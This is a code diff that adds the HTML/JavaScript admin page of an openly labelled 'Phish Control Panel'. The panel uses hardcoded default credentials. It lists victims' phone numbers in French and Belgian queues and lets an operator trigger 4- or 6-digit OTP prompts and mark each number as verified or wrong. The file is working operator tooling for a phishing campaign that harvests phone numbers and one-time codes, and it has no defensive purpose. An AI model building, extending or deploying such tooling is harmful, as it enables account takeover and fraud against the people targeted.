@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel — Phish Control</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .admin-container { max-width: 900px; margin: 0 auto; padding: 20px; }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .admin-header h1 { color: #fff; font-size: 24px; }
+        .admin-header .logout { color: #ff4444; cursor: pointer; }
+        .queue-selector { display: flex; gap: 12px; margin-bottom: 20px; }
+        .queue-btn { padding: 10px 24px; border-radius: 12px; border: 2px solid #2a2a2a; background: #141414; color: #fff; cursor: pointer; transition: all 0.2s; }
+        .queue-btn.active { border-color: #FFFC00; background: #1a1a1a; }
+        .queue-btn .badge { background: #FFFC00; color: #000; padding: 2px 10px; border-radius: 20px; font-size: 12px; margin-left: 8px; }
+        .number-card { background: #1e1e1e; border-radius: 16px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a2a; }
+        .number-card .number { font-size: 20px; font-weight: 600; color: #fff; }
+        .number-card .meta { color: #888; font-size: 14px; margin: 4px 0; }
+        .number-card .actions { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+        .number-card .actions button { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-size: 13px; transition: all 0.2s; }
+        .btn-otp4 { background: #FFFC00; color: #000; }
+        .btn-otp6 { background: #FFAA00; color: #000; }
+        .btn-wrong { background: #ff4444; color: #fff; }
+        .btn-verified { background: #00cc44; color: #fff; }
+        .btn-otp4:hover, .btn-otp6:hover { transform: scale(1.02); }
+        .empty-state { text-align: center; color: #555; padding: 40px; }
+        .otp-display { background: #141414; padding: 8px 16px; border-radius: 8px; font-family: monospace; font-size: 24px; color: #FFFC00; display: inline-block; margin: 8px 0; }
+        .login-form { max-width: 400px; margin: 100px auto; background: #1e1e1e; padding: 40px; border-radius: 24px; }
+        .login-form h2 { color: #fff; text-align: center; margin-bottom: 24px; }
+        .login-form input { width: 100%; padding: 14px; border-radius: 12px; border: 2px solid #2a2a2a; background: #141414; color: #fff; font-size: 16px; margin-bottom: 12px; outline: none; }
+        .login-form input:focus { border-color: #FFFC00; }
+        .login-form button { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #FFFC00; color: #000; font-size: 18px; font-weight: 600; cursor: pointer; }
+        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 12px; margin-bottom: 20px; }
+        .stat-card { background: #141414; padding: 16px; border-radius: 12px; text-align: center; border: 1px solid #2a2a2a; }
+        .stat-card .stat-value { color: #FFFC00; font-size: 28px; font-weight: 700; }
+        .stat-card .stat-label { color: #666; font-size: 12px; margin-top: 4px; }
+    </style>
+</head>
+<body>
+    <div id="loginPage" style="display:none;">
+        <div class="login-form">
+            <h2>🔐 Admin Login</h2>
+            <input type="text" id="loginUser" placeholder="Username" value="admin">
+            <input type="password" id="loginPass" placeholder="Password" value="admin123">
+            <button onclick="login()">Login →</button>
+            <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">Default: admin / admin123</p>
+        </div>
+    </div>
+
+    <div id="adminPage" style="display:none;">
+        <div class="admin-container">
+            <div class="admin-header">
+                <h1>💀 Phish Control Panel</h1>
+                <span class="logout" onclick="logout()">Logout</span>
+            </div>
+
+            <div class="stats-row" id="statsRow"></div>
+
+            <div class="queue-selector">
+                <button class="queue-btn active" onclick="switchQueue('A')">🇫🇷 France <span class="badge" id="countA">0</span></button>
+                <button class="queue-btn" onclick="switchQueue('B')">🇧🇪 Belgium <span class="badge" id="countB">0</span></button>
+                <button class="queue-btn" onclick="switchQueue('C')">🌍 Both <span class="badge" id="countC">0</span></button>
+            </div>
+
+            <div id="queueList">
+                <div class="empty-state">Select a queue to view numbers.</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let token = null;
+        let currentQueue = 'A';
+        let interval = null;
+
+        function login() {
+            const username = document.getElementById('loginUser').value;
+            const password = document.getElementById('loginPass').value;
+            
+            fetch('/api/admin/auth', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    token = data.token;
+                    document.getElementById('loginPage').style.display = 'none';
+                    document.getElementById('adminPage').style.display = 'block';
+                    loadQueues();
+                    interval = setInterval(loadQueues, 5000);
+                } else {
+                    alert('Invalid credentials');
+                }
+            });
+        }
+
+        function logout() {
+            clearInterval(interval);
+            token = null;
+            document.getElementById('adminPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+
+        function switchQueue(queue) {
+            currentQueue = queue;
+            document.querySelectorAll('.queue-btn').forEach(el => el.classList.remove('active'));
+            document.querySelector(`.queue-btn[onclick="switchQueue('${queue}')"]`).classList.add('active');
+            loadQueues();
+        }
+
+        function loadQueues() {
+            fetch('/api/admin/queues')
+                .then(res => res.json())
+                .then(data => {
+                    // Update counts
+                    document.getElementById('countA').textContent = data.A?.filter(e => e.status === 'pending').length || 0;
+                    document.getElementById('countB').textContent = data.B?.filter(e => e.status === 'pending').length || 0;
+                    document.getElementById('countC').textContent = data.C?.filter(e => e.status === 'pending').length || 0;
+
+                    // Update stats
+                    const total = Object.values(data).flat().length;
+                    const pending = Object.values(data).flat().filter(e => e.status === 'pending').length;
+                    const verified = Object.values(data).flat().filter(e => e.status === 'verified').length;
+                    document.getElementById('statsRow').innerHTML = `
+                        <div class="stat-card"><div class="stat-value">${total}</div><div class="stat-label">Total Numbers</div></div>
+                        <div class="stat-card"><div class="stat-value">${pending}</div><div class="stat-label">Pending</div></div>
+                        <div class="stat-card"><div class="stat-value">${verified}</div><div class="stat-label">Verified</div></div>
+                    `;
+
+                    // Show queue
+                    const entries = data[currentQueue] || [];
+                    const pendingEntries = entries.filter(e => e.status === 'pending');
+                    const list = document.getElementById('queueList');
+                    
+                    if (pendingEntries.length === 0) {
+                        list.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
+                        return;
+                    }
+
+                    list.innerHTML = pendingEntries.map(entry => `
+                        <div class="number-card" id="card-${entry.id}">
+                            <div class="number">📱 ${entry.number}</div>
+                            <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
+                            <div id="otpDisplay-${entry.id}"></div>
+                            <div class="actions">
+                                <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit OTP</button>
+                                <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit OTP</button>
+                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong Number</button>
+                                <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
+                            </div>
+                        </div>
+                    `).join('');
+                });
+        }
+
+        function sendOTP(queueId, length) {
+            const otp = String(Math.floor(Math.random() * (length === 4 ? 9000 : 900000)) + (length === 4 ? 1000 : 100000));
+            
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    queueId: queueId,
+                    action: length === 4 ? 'otp_4' : 'otp_6',
+                    otp: otp
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById(`otpDisplay-${queueId}`).innerHTML = `<div class="otp-display">📨 ${otp}</div>`;
+                    document.getElementById(`card-${queueId}`).style.borderColor = '#FFFC00';
+                    setTimeout(() => {
+                        document.getElementById(`card-${queueId}`).style.borderColor = '#2a2a2a';
+                    }, 3000);
+                }
+            });
+        }
+
+        function markWrong(queueId) {
+            if (!confirm('Mark this number as wrong?')) return;
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: queueId, action: 'wrong' })
+            })
+            .then(res => res.json())
+            .then(() => loadQueues());
+        }
+
+        function markVerified(queueId) {
+            if (!confirm('Mark this number as verified?')) return;
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: queueId, action: 'verified' })
+            })
+            .then(res => res.json())
+            .then(() => loadQueues());
+        }
+
+        // Check if already logged in
+        document.getElementById('loginPage').style.display = 'block';
+    </script>
+</body>
+</html>
